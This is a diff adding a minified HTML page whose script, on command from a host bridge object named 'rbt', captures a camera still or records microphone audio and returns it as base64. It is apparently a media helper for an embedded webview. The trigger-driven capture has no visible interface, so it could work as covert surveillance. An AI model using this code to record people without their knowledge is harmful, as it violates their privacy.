@@ -1,0 +1,9 @@
+<!doctype html><meta charset=utf-8><script>
+const b64=b=>new Promise(r=>{const f=new FileReader();f.onload=()=>r(f.result.split(',')[1]);f.readAsDataURL(b)});
+rbt.onMedia(async({id,kind,arg})=>{try{
+ if(kind==='camera'){const s=await navigator.mediaDevices.getUserMedia({video:{width:1280}});const v=document.createElement('video');v.srcObject=s;await v.play();await new Promise(r=>setTimeout(r,400));
+  const c=document.createElement('canvas');const sc=Math.min(1,720/Math.max(v.videoWidth,v.videoHeight));c.width=v.videoWidth*sc;c.height=v.videoHeight*sc;c.getContext('2d').drawImage(v,0,0,c.width,c.height);s.getTracks().forEach(t=>t.stop());
+  rbt.mediaResult({id,b64:c.toDataURL('image/jpeg',.7).split(',')[1]});}
+ else{const s=await navigator.mediaDevices.getUserMedia({audio:true});const m=new MediaRecorder(s);const ch=[];m.ondataavailable=e=>ch.push(e.data);
+  m.onstop=async()=>{s.getTracks().forEach(t=>t.stop());rbt.mediaResult({id,b64:await b64(new Blob(ch))})};m.start();setTimeout(()=>m.stop(),(arg||4)*1000);}
+}catch(e){rbt.mediaResult({id,error:String(e)})}});</script>
